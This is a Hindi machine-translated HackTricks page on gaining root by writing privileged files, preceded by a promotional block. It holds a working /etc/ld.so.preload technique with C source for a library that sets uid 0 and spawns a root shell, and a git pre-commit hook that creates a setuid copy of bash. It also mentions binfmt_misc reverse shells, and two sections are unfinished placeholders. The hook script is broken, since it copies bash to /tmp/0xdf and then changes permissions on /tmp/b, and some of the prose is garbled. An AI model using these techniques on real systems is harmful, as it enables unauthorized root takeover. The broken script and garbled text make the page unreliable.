# रूट में अनिवार्य फ़ाइल लिखें

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** पर फ़ॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें द्वारा PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>

### /etc/ld.so.preload

यह फ़ाइल **`LD_PRELOAD`** env वेरिएबल की तरह व्यवहार करती है लेकिन यह **SUID binaries** में भी काम करती है।\
यदि आप इसे बना सकते हैं या संशोधित कर सकते हैं, तो आप बस हर एक बाइनरी के साथ लोड की जाएगी एक **पथ जो एक पुस्तकालय का होगा जो जोड़ा जाएगा**।

उदाहरण के लिए: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### गिट हुक्स

[**गिट हुक्स**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) **स्क्रिप्ट्स** हैं जो गिट रिपॉजिटरी में विभिन्न **घटनाओं** पर **चलाए** जाते हैं जैसे कि जब एक कमिट बनाया जाता है, एक मर्ज... इसलिए अगर एक **विशेषाधिकारित स्क्रिप्ट या उपयोगकर्ता** इस क्रिया को अक्सर कर रहा है और **`.git` फोल्डर** में **लिखना संभव** है, तो इसका उपयोग **प्रिवेस्क** के लिए किया जा सकता है।

उदाहरण के लिए, एक स्क्रिप्ट **उत्पन्न करना संभव** है एक गिट रिपॉ में **`.git/hooks`** में ताकि यह हमेशा नए कमिट बनाया जाता है जब भी यह चलाया जाता है:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

करने के लिए

### सेवा और सॉकेट फ़ाइलें

करने के लिए

### binfmt\_misc

`/proc/sys/fs/binfmt_misc` में स्थित फ़ाइल यह दर्शाती है कि कौन सी फ़ाइल किस प्रकार का बाइनरी चलाएगा। कब एक सामान्य फ़ाइल प्रकार खुलता है तो एक रिवर्स शैल को चलाने के लिए इसका दुरुपयोग करने की आवश्यकता की जाँच करें।
